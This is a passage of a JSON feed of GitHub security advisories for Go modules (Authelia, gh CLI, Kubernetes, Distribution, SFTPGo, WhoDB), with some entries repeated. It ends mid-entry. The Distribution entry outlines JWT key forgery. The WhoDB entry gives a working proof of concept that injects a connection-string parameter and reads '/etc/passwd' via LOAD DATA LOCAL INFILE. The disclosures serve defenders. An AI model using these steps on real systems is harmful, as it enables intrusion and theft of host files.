{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>If users are allowed to sign in via both username and email the regulation system treats these as separate login events. This leads to the regulation limitations being effectively doubled assuming an attacker using brute-force to find a user password. It's important to note that due to the effective operation of regulation where no user-facing sign of their regulation ban being visible either via timing or via API responses, it's effectively impossible to determine if a failure occurs due to a bad username password combination, or a effective ban blocking the attempt which heavily mitigates any form of brute-force.</p>\n<h3 id=\"details\">Details</h3>\n<p>This occurs because the records and counting process for this system uses the method utilized for sign in rather than the effective username attribute.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>This has a minimal impact on account security, this impact is increased naturally in scenarios when there is no two-factor authentication required and weak passwords are used. This makes it a bit easier to brute-force a password.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<ol>\n<li>Do not heavily modify the default settings in a way that ends up with shorter or less frequent regulation bans. The default settings effectively mitigate any potential for this issue to be exploited.</li>\n<li>Disable the ability for users to login via an email address.</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/authelia/authelia/security/advisories/GHSA-m5mf-3963-4x26\">https://github.com/authelia/authelia/security/advisories/GHSA-m5mf-3963-4x26</a></li>\n<li><a href=\"https://github.com/authelia/authelia/commit/d4a54189aa6563912f9427b96dcb01eacafa785c\">https://github.com/authelia/authelia/commit/d4a54189aa6563912f9427b96dcb01eacafa785c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m5mf-3963-4x26\">https://github.com/advisories/GHSA-m5mf-3963-4x26</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m5mf-3963-4x26",
            "title": "[github.com/authelia/authelia/v4] Authelia applies regulation separately to Username-based logins to Email-based logins",
            "date_modified": "2025-02-19T17:48:27.000Z",
            "date_published": "2025-02-19T17:47:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m5mf-3963-4x26"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A bug in GitHub's Artifact Attestation CLI tool, <code>gh attestation verify</code>, may return an incorrect zero exit status when no matching attestations are found for the specified <code>--predicate-type &lt;value&gt;</code> or the default <code>https://slsa.dev/provenance/v1</code> if not specified. This issue only arises if an artifact has an attestation with a predicate type different from the one provided in the command. As a result, users relying solely on these exit codes may mistakenly believe the attestation has been verified, despite the absence of an attestation with the specified predicate type and the tool printing a verification failure.</p>\n<p>Users are advised to update <code>gh</code> to version <code>v2.67.0</code> as soon as possible.</p>\n<p>Initial report: <a href=\"https://github.com/cli/cli/issues/10418\">https://github.com/cli/cli/issues/10418</a>\nFix: <a href=\"https://github.com/cli/cli/pull/10421\">https://github.com/cli/cli/pull/10421</a></p>\n<h3 id=\"details\">Details</h3>\n<p>The gh attestation verify command fetches, loads, and attempts to verify attestations associated with a given artifact for a specified predicate type. If an attestation is found, but the predicate type does not match the one specified in the <code>gh attestation verify</code> command, the verification fails, but the program exits early.</p>\n<p>Due to a re-used uninitialized error variable, when no matching attestations are found, the relevant function returns <code>nil</code> instead of an error, causing the program to exit with a status code of <code>0</code>, which incorrectly suggests successful verification.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Run <code>gh attestation verify</code> with local attestations using the <code>--bundle</code> flag and specify a predicate type with <code>--predicate-type</code> that you know will not match any of the attestations the command will attempt to verify. Confirm that the command exits with a zero status code.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Users who rely exclusively on the exit status code of <code>gh attestation verify</code> may incorrectly verify an attestation when the attestation's predicate type does not match the specified predicate type in the command.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cli/cli/security/advisories/GHSA-fgw4-v983-mgp8\">https://github.com/cli/cli/security/advisories/GHSA-fgw4-v983-mgp8</a></li>\n<li><a href=\"https://github.com/cli/cli/issues/10418\">https://github.com/cli/cli/issues/10418</a></li>\n<li><a href=\"https://github.com/cli/cli/pull/10421\">https://github.com/cli/cli/pull/10421</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25204\">https://nvd.nist.gov/vuln/detail/CVE-2025-25204</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fgw4-v983-mgp8\">https://github.com/advisories/GHSA-fgw4-v983-mgp8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fgw4-v983-mgp8",
            "title": "[github.com/cli/cli/v2] `gh attestation verify` returns incorrect exit code during verification if no attestations are present",
            "date_modified": "2025-02-17T07:28:55.000Z",
            "date_published": "2025-02-14T17:19:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fgw4-v983-mgp8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue in MaysWind ezBookkeeping 0.7.0 allows a remote attacker to escalate privileges via the lack of rate limiting.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-57603\">https://nvd.nist.gov/vuln/detail/CVE-2024-57603</a></li>\n<li><a href=\"https://github.com/mayswind/ezbookkeeping/issues/33\">https://github.com/mayswind/ezbookkeeping/issues/33</a></li>\n<li><a href=\"https://hkohi.ca/vulnerability/1\">https://hkohi.ca/vulnerability/1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-772m-773g-qmhc\">https://github.com/advisories/GHSA-772m-773g-qmhc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-772m-773g-qmhc",
            "title": "[github.com/mayswind/ezbookkeeping] Missing rate limit in MaysWind ezBookkeeping",
            "date_modified": "2025-02-13T22:43:45.000Z",
            "date_published": "2025-02-13T00:33:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-772m-773g-qmhc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A security issue was discovered in Kubernetes where a large number of container checkpoint requests made to the unauthenticated kubelet read-only HTTP endpoint may cause a Node Denial of Service by filling the Node's disk.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-0426\">https://nvd.nist.gov/vuln/detail/CVE-2025-0426</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/130016\">https://github.com/kubernetes/kubernetes/issues/130016</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8\">https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/02/13/1\">http://www.openwall.com/lists/oss-security/2025/02/13/1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jgfp-53c3-624w\">https://github.com/advisories/GHSA-jgfp-53c3-624w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jgfp-53c3-624w",
            "title": "[k8s.io/kubernetes] Node Denial of Service via kubelet Checkpoint API",
            "date_modified": "2025-02-13T20:55:33.000Z",
            "date_published": "2025-02-13T18:32:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jgfp-53c3-624w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A security issue was discovered in Kubernetes where a large number of container checkpoint requests made to the unauthenticated kubelet read-only HTTP endpoint may cause a Node Denial of Service by filling the Node's disk.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-0426\">https://nvd.nist.gov/vuln/detail/CVE-2025-0426</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/130016\">https://github.com/kubernetes/kubernetes/issues/130016</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8\">https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/02/13/1\">http://www.openwall.com/lists/oss-security/2025/02/13/1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jgfp-53c3-624w\">https://github.com/advisories/GHSA-jgfp-53c3-624w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jgfp-53c3-624w",
            "title": "[k8s.io/kubernetes] Node Denial of Service via kubelet Checkpoint API",
            "date_modified": "2025-02-13T20:55:33.000Z",
            "date_published": "2025-02-13T18:32:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jgfp-53c3-624w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A security issue was discovered in Kubernetes where a large number of container checkpoint requests made to the unauthenticated kubelet read-only HTTP endpoint may cause a Node Denial of Service by filling the Node's disk.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-0426\">https://nvd.nist.gov/vuln/detail/CVE-2025-0426</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/130016\">https://github.com/kubernetes/kubernetes/issues/130016</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8\">https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/02/13/1\">http://www.openwall.com/lists/oss-security/2025/02/13/1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jgfp-53c3-624w\">https://github.com/advisories/GHSA-jgfp-53c3-624w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jgfp-53c3-624w",
            "title": "[k8s.io/kubernetes] Node Denial of Service via kubelet Checkpoint API",
            "date_modified": "2025-02-13T20:55:33.000Z",
            "date_published": "2025-02-13T18:32:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jgfp-53c3-624w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A security issue was discovered in Kubernetes where a large number of container checkpoint requests made to the unauthenticated kubelet read-only HTTP endpoint may cause a Node Denial of Service by filling the Node's disk.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-0426\">https://nvd.nist.gov/vuln/detail/CVE-2025-0426</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/130016\">https://github.com/kubernetes/kubernetes/issues/130016</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8\">https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/02/13/1\">http://www.openwall.com/lists/oss-security/2025/02/13/1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jgfp-53c3-624w\">https://github.com/advisories/GHSA-jgfp-53c3-624w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jgfp-53c3-624w",
            "title": "[k8s.io/kubernetes] Node Denial of Service via kubelet Checkpoint API",
            "date_modified": "2025-02-13T20:55:33.000Z",
            "date_published": "2025-02-13T18:32:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jgfp-53c3-624w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A flaw was found in openshift-gitops-operator-container. The openshift.io/cluster-monitoring label is applied to all namespaces that deploy an ArgoCD CR instance, allowing the namespace to create a rogue PrometheusRule. This issue can have adverse effects on the platform monitoring stack, as the rule is rolled out cluster-wide when the label is applied.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-13484\">https://nvd.nist.gov/vuln/detail/CVE-2024-13484</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2024-13484\">https://access.redhat.com/security/cve/CVE-2024-13484</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2269376\">https://bugzilla.redhat.com/show_bug.cgi?id=2269376</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-58fx-7v9q-3g56\">https://github.com/advisories/GHSA-58fx-7v9q-3g56</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-58fx-7v9q-3g56",
            "title": "[github.com/redhat-developer/gitops-operator] OpenShift GitOps Operator Namespace Isolation Break",
            "date_modified": "2025-02-13T15:08:58.000Z",
            "date_published": "2025-01-28T18:31:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-58fx-7v9q-3g56"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Chains using affected versions of Packet Forward Middleware in their IBC Transfer stack are vulnerable to an attack in which there is a potential denial of service. This affects IBC transfers for any asset which is being transferred between another chain and its native chain.</p>\n<p>We recommend upgrading as soon as possible.</p>\n<p><strong>THIS IS A STATE BREAKING CHANGE</strong></p>\n<h3 id=\"patches\">Patches</h3>\n<p>Versions <a href=\"https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv7.2.1\">7.2.1</a> and <a href=\"https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv8.1.1\">8.1.1</a> are patched.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>N/A</p>\n<h3 id=\"references\">References</h3>\n<p>N/A</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cosmos/ibc-apps/security/advisories/GHSA-6fgm-x6ff-w78f\">https://github.com/cosmos/ibc-apps/security/advisories/GHSA-6fgm-x6ff-w78f</a></li>\n<li><a href=\"https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv7.2.1\">https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv7.2.1</a></li>\n<li><a href=\"https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv8.1.1\">https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv8.1.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6fgm-x6ff-w78f\">https://github.com/advisories/GHSA-6fgm-x6ff-w78f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6fgm-x6ff-w78f",
            "title": "[github.com/cosmos/ibc-apps/middleware/packet-forward-middleware/v8] Potential Denial-of-Service condition leading to temporary disability in IBC transfers to the native chain",
            "date_modified": "2025-02-12T22:01:25.000Z",
            "date_published": "2025-02-12T22:01:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6fgm-x6ff-w78f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Chains using affected versions of Packet Forward Middleware in their IBC Transfer stack are vulnerable to an attack in which there is a potential denial of service. This affects IBC transfers for any asset which is being transferred between another chain and its native chain.</p>\n<p>We recommend upgrading as soon as possible.</p>\n<p><strong>THIS IS A STATE BREAKING CHANGE</strong></p>\n<h3 id=\"patches\">Patches</h3>\n<p>Versions <a href=\"https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv7.2.1\">7.2.1</a> and <a href=\"https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv8.1.1\">8.1.1</a> are patched.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>N/A</p>\n<h3 id=\"references\">References</h3>\n<p>N/A</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cosmos/ibc-apps/security/advisories/GHSA-6fgm-x6ff-w78f\">https://github.com/cosmos/ibc-apps/security/advisories/GHSA-6fgm-x6ff-w78f</a></li>\n<li><a href=\"https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv7.2.1\">https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv7.2.1</a></li>\n<li><a href=\"https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv8.1.1\">https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv8.1.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6fgm-x6ff-w78f\">https://github.com/advisories/GHSA-6fgm-x6ff-w78f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6fgm-x6ff-w78f",
            "title": "[github.com/cosmos/ibc-apps/middleware/packet-forward-middleware/v7] Potential Denial-of-Service condition leading to temporary disability in IBC transfers to the native chain",
            "date_modified": "2025-02-12T22:01:25.000Z",
            "date_published": "2025-02-12T22:01:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6fgm-x6ff-w78f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The Temporal api-go library prior to version 1.44.1 did not send <code>update response</code> information to Data Converter when the proxy package within the api-go module was used in a gRPC proxy prior to transmission. This resulted in&nbsp;information contained within the <code>update response</code> field not having Data Converter transformations (e.g. encryption) applied. This is an issue only when using the UpdateWorkflowExecution APIs (released on 13th January 2025)  with a proxy leveraging the api-go library before version 1.44.1.</p>\n<p>Other data fields were correctly sent to Data Converter. This issue does not impact the Data Converter server. Data was encrypted in transit. Temporal Cloud services are not impacted.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1243\">https://nvd.nist.gov/vuln/detail/CVE-2025-1243</a></li>\n<li><a href=\"https://github.com/temporalio/api-go/releases/tag/v1.44.1\">https://github.com/temporalio/api-go/releases/tag/v1.44.1</a></li>\n<li><a href=\"https://temporal.io/blog/announcing-a-new-operation-workflow-update\">https://temporal.io/blog/announcing-a-new-operation-workflow-update</a></li>\n<li><a href=\"https://github.com/temporalio/api-go/commit/dad8b169ada911d3778e070484d1ae78a58bd22b\">https://github.com/temporalio/api-go/commit/dad8b169ada911d3778e070484d1ae78a58bd22b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q9w6-cwj4-gf4p\">https://github.com/advisories/GHSA-q9w6-cwj4-gf4p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q9w6-cwj4-gf4p",
            "title": "[go.temporal.io/api] Unencrypted transmission in Temporal api-go library",
            "date_modified": "2025-02-12T19:37:53.000Z",
            "date_published": "2025-02-12T03:31:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q9w6-cwj4-gf4p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Calls to <code>cng.TLS1PRF</code> don't release the key handle, producing a small memory leak every time.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/microsoft/go-crypto-winnative/security/advisories/GHSA-29c6-3hcj-89cf\">https://github.com/microsoft/go-crypto-winnative/security/advisories/GHSA-29c6-3hcj-89cf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25199\">https://nvd.nist.gov/vuln/detail/CVE-2025-25199</a></li>\n<li><a href=\"https://github.com/microsoft/go-crypto-winnative/commit/f49c8e1379ea4b147d5bff1b3be5b0ff45792e41\">https://github.com/microsoft/go-crypto-winnative/commit/f49c8e1379ea4b147d5bff1b3be5b0ff45792e41</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-29c6-3hcj-89cf\">https://github.com/advisories/GHSA-29c6-3hcj-89cf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-29c6-3hcj-89cf",
            "title": "[github.com/microsoft/go-crypto-winnative] go-crypto-winnative BCryptGenerateSymmetricKey memory leak",
            "date_modified": "2025-02-12T19:21:02.000Z",
            "date_published": "2025-02-12T19:20:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-29c6-3hcj-89cf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Systems running registry version &gt; <code>3.0.0-beta.1</code> with token authentication enabled.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Update to at least <code>v3.0.0-rc.3</code></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no way to work around this issue without patching if your system requires token authentication.</p>\n<h3 id=\"references\">References</h3>\n<p>The issue lies in how the JWK verification is performed. When a JWT contains a JWK header without a certificate chain, the code only checks if the KeyID (<code>kid</code>) matches one of the trusted keys, but doesn't verify that the actual key material matches.</p>\n<p>Here's the problematic flow:</p>\n<ol>\n<li>An attacker generates their own key pair</li>\n<li>They create a JWT and include their public key in the JWK header</li>\n<li>They set the <code>kid</code> in the JWK to match one of the trusted keys' IDs (which they could potentially discover)</li>\n<li>They sign the JWT with their private key</li>\n<li>The registry only checks if the <code>kid</code> exists in the trusted keys map but then uses the attacker's public key from the JWK to verify the signature</li>\n</ol>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/distribution/distribution/security/advisories/GHSA-phw4-mc57-4hwc\">https://github.com/distribution/distribution/security/advisories/GHSA-phw4-mc57-4hwc</a></li>\n<li><a href=\"https://github.com/distribution/distribution/commit/5ea9aa028db65ca5665f6af2c20ecf9dc34e5fcd\">https://github.com/distribution/distribution/commit/5ea9aa028db65ca5665f6af2c20ecf9dc34e5fcd</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24976\">https://nvd.nist.gov/vuln/detail/CVE-2025-24976</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-phw4-mc57-4hwc\">https://github.com/advisories/GHSA-phw4-mc57-4hwc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-phw4-mc57-4hwc",
            "title": "[github.com/distribution/distribution/v3] Distribution's token authentication allows to inject an untrusted signing key in a JWT",
            "date_modified": "2025-02-11T19:07:48.000Z",
            "date_published": "2025-02-11T17:57:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-phw4-mc57-4hwc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>SFTPGo supports execution of a defined set of commands via SSH. Besides a set of default commands some optional commands can be activated, one of them being <code>rsync</code>: it is disabled in the default configuration and it is limited to the local filesystem, it does not work with cloud/remote storage backends.</p>\n<p>Due to missing sanitization of the client provided <code>rsync</code> command, an authenticated remote user can use some options of the rsync command to read or write files with the permissions of the SFTPGo server process. </p>\n<h3 id=\"patches\">Patches</h3>\n<p>This issue was fixed in version v2.6.5 by checking the client provided arguments.</p>\n<p><a href=\"https://github.com/drakkan/sftpgo/commit/b347ab6051f6c501da205c09315fe99cd1fa3ba1\">https://github.com/drakkan/sftpgo/commit/b347ab6051f6c501da205c09315fe99cd1fa3ba1</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/drakkan/sftpgo/security/advisories/GHSA-vj7w-3m8c-6vpx\">https://github.com/drakkan/sftpgo/security/advisories/GHSA-vj7w-3m8c-6vpx</a></li>\n<li><a href=\"https://github.com/drakkan/sftpgo/commit/b347ab6051f6c501da205c09315fe99cd1fa3ba1\">https://github.com/drakkan/sftpgo/commit/b347ab6051f6c501da205c09315fe99cd1fa3ba1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24366\">https://nvd.nist.gov/vuln/detail/CVE-2025-24366</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vj7w-3m8c-6vpx\">https://github.com/advisories/GHSA-vj7w-3m8c-6vpx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vj7w-3m8c-6vpx",
            "title": "[github.com/drakkan/sftpgo] SFTPGo has insufficient sanitization of user provided rsync command",
            "date_modified": "2025-02-10T17:01:47.000Z",
            "date_published": "2025-02-07T20:31:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vj7w-3m8c-6vpx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>SFTPGo supports execution of a defined set of commands via SSH. Besides a set of default commands some optional commands can be activated, one of them being <code>rsync</code>: it is disabled in the default configuration and it is limited to the local filesystem, it does not work with cloud/remote storage backends.</p>\n<p>Due to missing sanitization of the client provided <code>rsync</code> command, an authenticated remote user can use some options of the rsync command to read or write files with the permissions of the SFTPGo server process. </p>\n<h3 id=\"patches\">Patches</h3>\n<p>This issue was fixed in version v2.6.5 by checking the client provided arguments.</p>\n<p><a href=\"https://github.com/drakkan/sftpgo/commit/b347ab6051f6c501da205c09315fe99cd1fa3ba1\">https://github.com/drakkan/sftpgo/commit/b347ab6051f6c501da205c09315fe99cd1fa3ba1</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/drakkan/sftpgo/security/advisories/GHSA-vj7w-3m8c-6vpx\">https://github.com/drakkan/sftpgo/security/advisories/GHSA-vj7w-3m8c-6vpx</a></li>\n<li><a href=\"https://github.com/drakkan/sftpgo/commit/b347ab6051f6c501da205c09315fe99cd1fa3ba1\">https://github.com/drakkan/sftpgo/commit/b347ab6051f6c501da205c09315fe99cd1fa3ba1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24366\">https://nvd.nist.gov/vuln/detail/CVE-2025-24366</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vj7w-3m8c-6vpx\">https://github.com/advisories/GHSA-vj7w-3m8c-6vpx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vj7w-3m8c-6vpx",
            "title": "[github.com/drakkan/sftpgo/v2] SFTPGo has insufficient sanitization of user provided rsync command",
            "date_modified": "2025-02-10T17:01:47.000Z",
            "date_published": "2025-02-07T20:31:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vj7w-3m8c-6vpx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The application is vulnerable to parameter injection in database connection strings, which allows an attacker to read local files on the machine the application is running on.</p>\n<h3 id=\"details\">Details</h3>\n<p>The application uses string concatenation to build database connection URIs which are then passed to corresponding libraries responsible for setting up the database connections.</p>\n<p>This string concatenation is done unsafely and without escaping or encoding the user input. This allows an user, in many cases, to inject arbitrary parameters into the URI string. These parameters can be potentially dangerous depending on the libraries used.</p>\n<p>One of these dangerous parameters is <code>allowAllFiles</code> in the library <code>github.com/go-sql-driver/mysql</code>. Should this be set to <code>true</code>, the library enables running the <code>LOAD DATA LOCAL INFILE</code> query on any file on the host machine (in this case, the machine that WhoDB is running on). Source: <a href=\"https://github.com/go-sql-driver/mysql/blob/7403860363ca112af503b4612568c3096fecb466/infile.go#L128\">https://github.com/go-sql-driver/mysql/blob/7403860363ca112af503b4612568c3096fecb466/infile.go#L128</a></p>\n<p>By injecting <code>&amp;allowAllFiles=true</code> into the connection URI and connecting to any MySQL server (such as an attacker-controlled one), the attacker is able to read local files.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>As this vulnerability does not require sending requests manually and can all be done using the WhoDB UI, screenshots are provided instead of HTTP requests.</p>\n<p>For this proof-of-concept, a clean instance of WhoDB and MySQL were set up using podman (docker is a suitable alternative):</p>\n<pre><code>podman network create whodb-poc\npodman run -d -p 8080:8080 --network whodb-poc docker.io/clidey/whodb\npodman run -d --name mysql -e MYSQL_ROOT_PASSWORD=password --network whodb-poc docker.io/mysql:9\n</code></pre>\n<p>The attacker connects to the database via WhoDB. Note that in the <code>Loc</code> field, the string <code>&amp;allowAllFiles=true</code> is inserted:</p>\n<p><img alt=\"2025-01-21-13-28-08\" src=\"https://github.com/user-attachments/assets/28709707-97e4-4d26-b61c-5462db6dd43f\"></p>\n<p>After connecting, the attacker navigates to the scratchpad in <code>/scratchpad</code>.</p>\n<p>The attacker first creates a demo table:</p>\n<pre><code class=\"language-sql\">CREATE TABLE poc (\n    line TEXT\n);\n</code></pre>\n<p>The attacker then enables loading files from the server side. For the sake of clarity, do note that while this is required, the file is not being read from the remote server where MySQL is running, but the local machine that WhoDB is running on.</p>\n<pre><code class=\"language-sql\">SET GLOBAL local_infile=1;\n</code></pre>\n<p>The attacker then uses the <code>LOAD DATA LOCAL INFILE</code> statement to read the contents of <code>/etc/passwd</code> (in this case from inside the container where WhoDB is running) into the previously created table:</p>\n<pre><code class=\"language-sql\">LOAD DATA LOCAL INFILE '/etc/passwd'\nINTO TABLE poc\nFIELDS TERMINATED BY '\\0'\nLINES TERMINATED BY '\\n';\n</code></pre>\n<p>The attacker then navigates to the <code>poc</code> table in the <em>Tables</em> view and observes that the file has been read successfully:</p>\n<p><img alt=\"2025-01-21-14-04-47\" src=\"https://github.com/user-attachments/assets/c8f499ce-0d40-49ba-a2c6-fe2d12c677c5\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>While this proof-of-concept demonstrates local file inclusion, the root cause of the issue is the unsafe construction of database connection URIs from user input. Not all database connector libraries used in WhoDB were inspected; there may be libraries which allow for even more impactful parameters.</p>\n<p>The attack requires no user authentication to WhoDB (only authentication to any database server, such as an attacker-controlled one) and no special configuration - the default configuration of the application is vulnerable.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a 